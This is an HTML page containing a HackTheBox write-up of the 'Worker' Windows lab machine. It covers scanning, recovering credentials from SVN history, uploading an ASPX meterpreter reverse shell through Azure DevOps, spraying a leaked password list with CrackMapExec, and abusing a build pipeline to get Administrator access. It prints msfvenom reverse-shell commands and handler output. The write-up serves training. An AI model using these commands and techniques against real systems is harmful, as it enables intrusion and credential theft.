<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Worker | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,medium"><meta name=description content="Worker HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/worker/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/worker/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Worker "><meta property="og:description" content="Worker HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/worker/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/worker/worker.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-31T17:50:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/worker/worker.png"><meta name=twitter:title content="Worker "><meta name=twitter:description content="Worker HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Worker ","item":"https://s4ch.github.io/writeups/hackthebox/worker/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Worker ","name":"Worker ","description":"Worker HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","medium"],"articleBody":"Information Name: Worker Profile: www.hackthebox.eu Difficulty: Medium OS: Windows Points: 30 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap man ffuf subversion lynx metasploit crackmapexec evil-winrm Network enumeration Let’s run a [nmap][nmap] scan to find port and services:\n# Nmap 7.80 scan initiated Tue Oct 20 20:33:43 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.203 Nmap scan report for 10.10.10.203 Host is up (0.023s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3690/tcp open svnserve Subversion 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Oct 20 20:35:39 2020 -- 1 IP address (1 host up) scanned in 115.81 seconds And add the local domain to our hosts file.\n$ cat /etc/hosts | grep worker 10.10.10.203 worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb HTTP enumeration http://worker.htb/ is displaying the default IIS home page, but enumeration with ffuf gives nothing.\nSVN On port 3690 we have a SVN server. 3690 is the default port for svnserve service.\nsvnserve allows access to Subversion repositories using Subversion’s custom network protocol.\nYou can run svnserve as a standalone server process (for clients that are using the svn:// access method); you can have a daemon such as inetd or xinetd launch it for you on demand (also for svn://), or you can have sshd launch it on demand for the svn+ssh:// access method.\nSo let’s find some information:\n$ svn info svn://worker.htb Path: . URL: svn://worker.htb Relative URL: ^/ Repository Root: svn://worker.htb Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1 Revision: 5 Node Kind: directory Last Changed Author: nathen Last Changed Rev: 5 Last Changed Date: 2020-06-20 15:52:00 +0200 (Sat, 20 Jun 2020) Let’s use the command to list directory entries in the repository:\n$ svn list svn://worker.htb dimension.worker.htb/ moved.tx Let’s export a clean directory tree from the repository specified by URL:\n$ mkdir svn \u0026\u0026 cd svn \u0026\u0026 svn export --force svn://worker.htb A . A dimension.worker.htb A dimension.worker.htb/LICENSE.txt A dimension.worker.htb/README.txt A dimension.worker.htb/assets A dimension.worker.htb/assets/css A dimension.worker.htb/assets/css/fontawesome-all.min.css A dimension.worker.htb/assets/css/main.css A dimension.worker.htb/assets/css/noscript.css A dimension.worker.htb/assets/js A dimension.worker.htb/assets/js/breakpoints.min.js A dimension.worker.htb/assets/js/browser.min.js A dimension.worker.htb/assets/js/jquery.min.js A dimension.worker.htb/assets/js/main.js A dimension.worker.htb/assets/js/util.js A dimension.worker.htb/assets/sass A dimension.worker.htb/assets/sass/base A dimension.worker.htb/assets/sass/base/_page.scss A dimension.worker.htb/assets/sass/base/_reset.scss A dimension.worker.htb/assets/sass/base/_typography.scss A dimension.worker.htb/assets/sass/components A dimension.worker.htb/assets/sass/components/_actions.scss A dimension.worker.htb/assets/sass/components/_box.scss A dimension.worker.htb/assets/sass/components/_button.scss A dimension.worker.htb/assets/sass/components/_form.scss A dimension.worker.htb/assets/sass/components/_icon.scss A dimension.worker.htb/assets/sass/components/_icons.scss A dimension.worker.htb/assets/sass/components/_image.scss A dimension.worker.htb/assets/sass/components/_list.scss A dimension.worker.htb/assets/sass/components/_table.scss A dimension.worker.htb/assets/sass/layout A dimension.worker.htb/assets/sass/layout/_bg.scss A dimension.worker.htb/assets/sass/layout/_footer.scss A dimension.worker.htb/assets/sass/layout/_header.scss A dimension.worker.htb/assets/sass/layout/_main.scss A dimension.worker.htb/assets/sass/layout/_wrapper.scss A dimension.worker.htb/assets/sass/libs A dimension.worker.htb/assets/sass/libs/_breakpoints.scss A dimension.worker.htb/assets/sass/libs/_functions.scss A dimension.worker.htb/assets/sass/libs/_mixins.scss A dimension.worker.htb/assets/sass/libs/_vars.scss A dimension.worker.htb/assets/sass/libs/_vendor.scss A dimension.worker.htb/assets/sass/main.scss A dimension.worker.htb/assets/sass/noscript.scss A dimension.worker.htb/assets/webfonts A dimension.worker.htb/assets/webfonts/fa-brands-400.eot A dimension.worker.htb/assets/webfonts/fa-brands-400.svg A dimension.worker.htb/assets/webfonts/fa-brands-400.ttf A dimension.worker.htb/assets/webfonts/fa-brands-400.woff A dimension.worker.htb/assets/webfonts/fa-brands-400.woff2 A dimension.worker.htb/assets/webfonts/fa-regular-400.eot A dimension.worker.htb/assets/webfonts/fa-regular-400.svg A dimension.worker.htb/assets/webfonts/fa-regular-400.ttf A dimension.worker.htb/assets/webfonts/fa-regular-400.woff A dimension.worker.htb/assets/webfonts/fa-regular-400.woff2 A dimension.worker.htb/assets/webfonts/fa-solid-900.eot A dimension.worker.htb/assets/webfonts/fa-solid-900.svg A dimension.worker.htb/assets/webfonts/fa-solid-900.ttf A dimension.worker.htb/assets/webfonts/fa-solid-900.woff A dimension.worker.htb/assets/webfonts/fa-solid-900.woff2 A dimension.worker.htb/images A dimension.worker.htb/images/bg.jpg A dimension.worker.htb/images/overlay.png A dimension.worker.htb/images/pic01.jpg A dimension.worker.htb/images/pic02.jpg A dimension.worker.htb/images/pic03.jpg A dimension.worker.htb/index.html A moved.txt Exported revision 5. Let’s see the first one, which is explicit:\n$ cat moved.txt This repository has been migrated and will no longer be maintained here. You can find the latest version at: http://devops.worker.htb // The Worker team :) On the other repository we can find a showcase website that is listing some projects and that can give us new sub-domains:\n$ lynx -dump -listonly -nonumbers dimension.worker.htb/index.html | grep http http://alpha.worker.htb/ http://cartoon.worker.htb/ http://lens.worker.htb/ http://solid-state.worker.htb/ http://spectral.worker.htb/ http://story.worker.htb/ https://html5up.net/ If we go at http://devops.worker.htb it ask some credentials for basic auth. But we have none yet.\nBut we saw earlier there was 5 revisions so there may be information in a previous revision.\n$ svn list -r 3 svn://worker.htb deploy.ps1 dimension.worker.htb/ Cool, we have found a powershell script.\n$ svn checkout -r 3 svn://worker.htb deploy.ps1\n$user = \"nathen\" # NOTE: We cant have my password here!!! $plain = \"\" $pwd = ($plain | ConvertTo-SecureString) $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd $args = \"Copy-Site.ps1\" Start-Process powershell.exe -Credential $Credential -ArgumentList (\"-file $args\") No password here, let’s check another revision:\n$ svn checkout -r 2 svn://worker.htb U deploy.ps1 Checked out revision 2. deploy.ps1\n$user = \"nathen\" $plain = \"wendel98\" $pwd = ($plain | ConvertTo-SecureString) $Credential = New-Object System.Management.Automation.PSCredential $user, $pwd $args = \"Copy-Site.ps1\" Start-Process powershell.exe -Credential $Credential -ArgumentList (\"-file $args\") This time the password is here. We can connect with those credentials to http://devops.worker.htb/.\nExploiting Azure DevOps We have access to a repository http://devops.worker.htb/ekenas/SmartHotel360\nLook at the different projects we have access to:\nA lot of them are matching the sub-domains we found earlier\nalpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb All those domains are hosting a web application and we can control the source, so we’ll be able to upload a reverse shell to the master branch and access it wia the web application.\nFirst, let’s generate an ASPX reverse shell:\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f aspx \u003e cyfun.aspx Found 1 compatible encoders Attempting to encode payload with 1 iterations of generic/none generic/none succeeded with size 510 (iteration=0) generic/none chosen with final size 510 Payload size: 510 bytes Final size of aspx file: 3663 bytes Here a few steps I won’t details too much.\nSelect a project, eg. Alpha Create a new branch Upload the reverse shell to the branch (eg. in assets folder) Create a PR Match merge policies: approve and link a work item Complete the PR (merge) Start a listener:\nmsf5 exploit(multi/handler) \u003e options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.174 yes The listen address (an interface may be specified) LPORT 9999 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u003e run [*] Started reverse TCP handler on 10.10.14.174:9999 [*] Sending stage (201283 bytes) to 10.10.10.203 [*] Meterpreter session 1 opened (10.10.14.174:9999 -\u003e 10.10.10.203:55557) at 2020-10-21 20:33:24 +0200 meterpreter \u003e Access the reverse shell \u0026 enjoy the meterpreter http://alpha.worker.htb/assets/cyfun.aspx\nPrivilege Escalation of Machine : from iis apppool\\defaultapppool to robisl meterpreter \u003e shell Process 8920 created. Channel 1 created. Microsoft Windows [Version 10.0.17763.1282] (c) 2018 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u003ewhoami iis apppool\\defaultapppool Let’s list the available drives:\nc:\\windows\\system32\\inetsrv\u003ewmic logicaldisk get volumename,name,caption Caption Name VolumeName C: C: W: W: Work c:\\windows\\system32\\inetsrv\u003efsutil fsinfo drives Drives: C:\\ W:\\ We have an unusual drive with label W:\nc:\\windows\\system32\\inetsrv\u003els w:\\ AzureDevOpsData System Volume Information agents sites svnrepos Using a Guifre technique to quickly loot password I found a promising file:\nc:\\windows\\system32\\inetsrv\u003edir w:\\ /s /b | findstr /si pass* ... w:\\svnrepos\\www\\conf\\passwd c:\\windows\\system32\\inetsrv\u003ecat w:\\svnrepos\\www\\conf\\passwd ### This file is an example password file for svnserve. ### Its format is similar to that of svnserve.conf. As shown in the ### example below it contains one section labelled [users]. ### The name and password for each user follow, one account per line. [users] nathen = wendel98 nichin = fqerfqerf nichin = asifhiefh noahip = player nuahip = wkjdnw oakhol = bxwdjhcue owehol = supersecret paihol = painfulcode parhol = gitcommit pathop = iliketomoveit pauhor = nowayjose payhos = icanjive perhou = elvisisalive peyhou = ineedvacation phihou = pokemon quehub = pickme quihud = kindasecure rachul = guesswho raehun = idontknow ramhun = thisis ranhut = getting rebhyd = rediculous reeinc = iagree reeing = tosomepoint reiing = isthisenough renipr = dummy rhiire = users riairv = canyou ricisa = seewhich robish = onesare robisl = wolves11 robive = andwhich ronkay = onesare rubkei = the rupkel = sheeps ryakel = imtired sabken = drjones samken = aqua sapket = hamburger sarkil = friday Wow tons of creds.\nLet’s put username and password in files.\nI’ll use [crackmaexec][cme] for password spraying.\n–no-bruteforce - No spray when using file for username and password (user1 =\u003e password1, user2 =\u003e password2\n–continue-on-success - continues authentication attempts even after successes\n$ cme winrm 10.10.10.203 --no-bruteforce -u usernames.txt -p passwords.txt --continue-on-success WINRM 10.10.10.203 5985 NONE [*] None (name:10.10.10.203) (domain:None) WINRM 10.10.10.203 5985 NONE [*] http://10.10.10.203:5985/wsman WINRM 10.10.10.203 5985 NONE [-] None\\nathen:wendel98 WINRM 10.10.10.203 5985 NONE [-] None\\nichin:fqerfqerf WINRM 10.10.10.203 5985 NONE [-] None\\nichin:asifhiefh WINRM 10.10.10.203 5985 NONE [-] None\\noahip:player WINRM 10.10.10.203 5985 NONE [-] None\\nuahip:wkjdnw WINRM 10.10.10.203 5985 NONE [-] None\\oakhol:bxwdjhcue WINRM 10.10.10.203 5985 NONE [-] None\\owehol:supersecret WINRM 10.10.10.203 5985 NONE [-] None\\paihol:painfulcode WINRM 10.10.10.203 5985 NONE [-] None\\parhol:gitcommit WINRM 10.10.10.203 5985 NONE [-] None\\pathop:iliketomoveit WINRM 10.10.10.203 5985 NONE [-] None\\pauhor:nowayjose WINRM 10.10.10.203 5985 NONE [-] None\\payhos:icanjive WINRM 10.10.10.203 5985 NONE [-] None\\perhou:elvisisalive WINRM 10.10.10.203 5985 NONE [-] None\\peyhou:ineedvacation WINRM 10.10.10.203 5985 NONE [-] None\\phihou:pokemon WINRM 10.10.10.203 5985 NONE [-] None\\quehub:pickme WINRM 10.10.10.203 5985 NONE [-] None\\quihud:kindasecure WINRM 10.10.10.203 5985 NONE [-] None\\rachul:guesswho WINRM 10.10.10.203 5985 NONE [-] None\\raehun:idontknow WINRM 10.10.10.203 5985 NONE [-] None\\ramhun:thisis WINRM 10.10.10.203 5985 NONE [-] None\\ranhut:getting WINRM 10.10.10.203 5985 NONE [-] None\\rebhyd:rediculous WINRM 10.10.10.203 5985 NONE [-] None\\reeinc:iagree WINRM 10.10.10.203 5985 NONE [-] None\\reeing:tosomepoint WINRM 10.10.10.203 5985 NONE [-] None\\reiing:isthisenough WINRM 10.10.10.203 5985 NONE [-] None\\renipr:dummy WINRM 10.10.10.203 5985 NONE [-] None\\rhiire:users WINRM 10.10.10.203 5985 NONE [-] None\\riairv:canyou WINRM 10.10.10.203 5985 NONE [-] None\\ricisa:seewhich WINRM 10.10.10.203 5985 NONE [-] None\\robish:onesare WINRM 10.10.10.203 5985 NONE [+] None\\robisl:wolves11 (Pwn3d!) WINRM 10.10.10.203 5985 NONE [-] None\\robive:andwhich WINRM 10.10.10.203 5985 NONE [-] None\\ronkay:onesare WINRM 10.10.10.203 5985 NONE [-] None\\rubkei:the WINRM 10.10.10.203 5985 NONE [-] None\\rupkel:sheeps WINRM 10.10.10.203 5985 NONE [-] None\\ryakel:imtired WINRM 10.10.10.203 5985 NONE [-] None\\sabken:drjones WINRM 10.10.10.203 5985 NONE [-] None\\samken:aqua WINRM 10.10.10.203 5985 NONE [-] None\\sapket:hamburger WINRM 10.10.10.203 5985 NONE [-] None\\sarkil:friday So we have only one set of valid credentials: robisl:wolves11.\nNow let’s connect with [evil-winrm][evil-winrm]:\n$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203 Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\robisl\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\robisl\u003e gc Desktop/user.txt 571ead91c15070e615b5882f25bad03d Privilege Escalation of Machine : from robisl to Administrator We can enumerate a bit but there is nothing more we can see with robisl than we were able to see with the IIS account.\nSo lets go back to http://devops.worker.htb, sign out and sign in back as robisl.\nNow we can see a different project than earlier: http://devops.worker.htb/ekenas/PartsUnlimited\nThis time we don’t have a PartsUnlimited sub-domain, there is a lot of files in the repository but nothing seems useful.\nAs an everyday user of GitLab I know I can run some tests in a docker thanks to the integrated GitLab CI pipeline (no need to configure an external CI) that yo ucan configure through .gitlab-ci.yml.\nIt seems Azure Devops has a similar feature: New Pipeline \u003e Azure Repos Git \u003e PartsUnlimited \u003e Starter Pipeline \u003e azure-pipelines.yml.\nWe are welcomed with a default template:\n# Starter pipeline # Start with a minimal pipeline that you can customize to build and deploy your code. # Add steps that build, run tests, deploy, and more: # https://aka.ms/yaml trigger: - master pool: 'Default' steps: - script: echo Hello, world! displayName: 'Run a one-line script' - script: | echo Add other tasks to build, test, and deploy your project. echo See https://aka.ms/yaml displayName: 'Run a multi-line script' Let’s create a new reverse shell (an exe this time).\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw \u003e cyfun.exe Found 1 compatible encoders Attempting to encode payload with 1 iterations of generic/none generic/none succeeded with size 510 (iteration=0) generic/none chosen with final size 510 Payload size: 510 bytes Start a listener aagain:\nmsf5 exploit(multi/handler) \u003e options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.174 yes The listen address (an interface may be specified) LPORT 9999 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target [evil-winrm][evil-winrm] allows us to upload a file:\n*Evil-WinRM* PS C:\\Users\\robisl\\Downloads\u003e upload /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe Info: Uploading /home/cyfun/CTF/HackTheBox/machines/Worker/cyfun.exe to C:\\Users\\robisl\\Downloads\\cyfun.exe Data: 680 bytes of 680 bytes copied Info: Upload successful! *Evil-WinRM* PS C:\\Users\\robisl\\Downloads\u003e pwd Path ---- C:\\Users\\robisl\\Downloads Now modify the template pipelien to\n# Starter pipeline # Start with a minimal pipeline that you can customize to build and deploy your code. # Add steps that build, run tests, deploy, and more: # https://aka.ms/yaml trigger: - master pool: 'Default' steps: - script: C:\\Users\\robisl\\Downloads\\cyfun.exe displayName: 'cyfun' Then save and run to a new branch and PR to master.\nWhen the pipeline ran I got an error:\nThe pipeline is not valid. Could not find a pool with name Default. The pool does not exist or has not been authorized for use. Going to http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues I was there was an Agent pool named Setup that was owner by the administrator.\nSo I changed my template to the following and created a new pipeline:\n# Starter pipeline # Start with a minimal pipeline that you can customize to build and deploy your code. # Add steps that build, run tests, deploy, and more: # https://aka.ms/yaml trigger: - master pool: 'Setup' steps: - script: C:\\Users\\robisl\\Downloads\\cyfun.exe displayName: 'cyfun' Here is the execution of the pipeline task “cyfun”:\n##[section]Starting: cyfun ============================================================================== Task : Command line Description : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows Version : 2.151.1 Author : Microsoft Corporation Help : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line ============================================================================== Generating script. Script contents: C:\\Users\\robisl\\Downloads\\cyfun.exe ========================== Starting Command Output =========================== ##[command]\"C:\\Windows\\system32\\cmd.exe\" /D /E:ON /V:OFF /S /C \"CALL \"w:\\agents\\agent11\\_work\\_temp\\31fb30ee-8d29-41e3-9ab0-529b331cef0e.cmd\"\" ##[error]This version of C:\\Users\\robisl\\Downloads\\cyfun.exe is not compatible with the version of Windows you're running. Check your computer's system information and then contact the software publisher. ##[error]Cmd.exe exited with code '1'. ##[section]Finishing: cyfun Seems to be the wrong architecture.\nSo I created a 32 bits reverse shell instead of a 64 bits one:\n$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw \u003e cyfun.exe Found 1 compatible encoders Attempting to encode payload with 1 iterations of generic/none generic/none succeeded with size 341 (iteration=0) generic/none chosen with final size 341 Payload size: 341 bytes Same error again, ok let’s forget the shell, let’s just display the root flag.\ntrigger: - master pool: 'Setup' steps: - script: type C:\\Users\\Administrator\\Desktop\\root.txt displayName: 'cyfun' Here are the logs of our pipeline task build:\n##[section]Starting: cyfun ============================================================================== Task : Command line Description : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows Version : 2.151.1 Author : Microsoft Corporation Help : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line ============================================================================== Generating script. Script contents: type C:\\Users\\Administrator\\Desktop\\root.txt ========================== Starting Command Output =========================== ##[command]\"C:\\Windows\\system32\\cmd.exe\" /D /E:ON /V:OFF /S /C \"CALL \"w:\\agents\\agent11\\_work\\_temp\\d9359887-a4ac-49ad-9865-3e9b9024f109.cmd\"\" c8d6aeda24c4e17abcc72f26dedbe919 ##[section]Finishing: cyfun ","wordCount":"2421","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/worker/worker.png","datePublished":"2021-01-31T17:50:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/worker/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Worker</h1><div class=post-description>Worker HackTheBox writeup</div><div class=post-meta>&lt;span title='2021-01-31 17:50:00 +0000 UTC'>January 31, 2021&lt;/span>&amp;nbsp;·&amp;nbsp;12 min&amp;nbsp;·&amp;nbsp;2421 words&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/tags/ctf/" class="post-tag" title="ctf">ctf&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/hackthebox/" class="post-tag" title="hackthebox">hackthebox&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/penetration-testing/" class="post-tag" title="penetration-testing">penetration-testing&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/writeup/" class="post-tag" title="writeup">writeup&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/windows/" class="post-tag" title="windows">windows&lt;/a>
,
&lt;a href="https://s4ch.github.io/tags/medium/" class="post-tag" title="medium">medium&lt;/a>
&amp;nbsp;·&amp;nbsp;
&lt;a href="https://s4ch.github.io/categories/writeups/" class="post-tag" title="writeups">writeups&lt;/a>
&amp;nbsp;·&amp;nbsp;&lt;a href=".RelPermalink">permalink&lt;/a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/worker/worker.png alt="Worker HackTheBox Machine"><p>Worker - Medium Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#http-enumeration>HTTP enumeration</a></li><li><a href=#svn>SVN</a></li><li><a href=#exploiting-azure-devops>Exploiting Azure DevOps</a></li><li><a href=#privilege-escalation-of-machine--from-iis-apppooldefaultapppool-to-robisl>Privilege Escalation of Machine : from iis apppool\defaultapppool to robisl</a></li><li><a href=#privilege-escalation-of-machine--from-robisl-to-administrator>Privilege Escalation of Machine : from robisl to Administrator</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Worker</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/270>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Medium</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 30</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap man ffuf subversion lynx metasploit crackmapexec evil-winrm
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Let&rsquo;s run a [nmap][nmap] scan to find port and services:</p><pre tabindex=0><code># Nmap 7.80 scan initiated Tue Oct 20 20:33:43 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.203
Nmap scan report for 10.10.10.203
Host is up (0.023s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 20 20:35:39 2020 -- 1 IP address (1 host up) scanned in 115.81 seconds
</code></pre><p>And add the local domain to our hosts file.</p><pre tabindex=0><code>$ cat /etc/hosts | grep worker
10.10.10.203 worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb
</code></pre><h2 id=http-enumeration>HTTP enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h2><p><a href=http://worker.htb/>http://worker.htb/</a> is displaying the default IIS home page, but enumeration
with <a href=https://github.com/ffuf/ffuf>ffuf</a> gives nothing.</p><h2 id=svn>SVN<a hidden class=anchor aria-hidden=true href=#svn>#</a></h2><p>On port 3690 we have a SVN server. 3690 is the default port for
<a href=http://svnbook.red-bean.com/en/1.8/svn.ref.svnserve.re.html>svnserve</a> service.</p><blockquote><p>svnserve allows access to Subversion repositories using Subversion&rsquo;s custom network protocol.</p><p>You can run svnserve as a standalone server process (for clients that are using the svn:// access method); you can have a daemon such as inetd or xinetd launch it for you on demand (also for svn://), or you can have sshd launch it on demand for the svn+ssh:// access method.</p></blockquote><p>So let&rsquo;s find some information:</p><pre tabindex=0><code>$ svn info svn://worker.htb
Path: .
URL: svn://worker.htb
Relative URL: ^/
Repository Root: svn://worker.htb
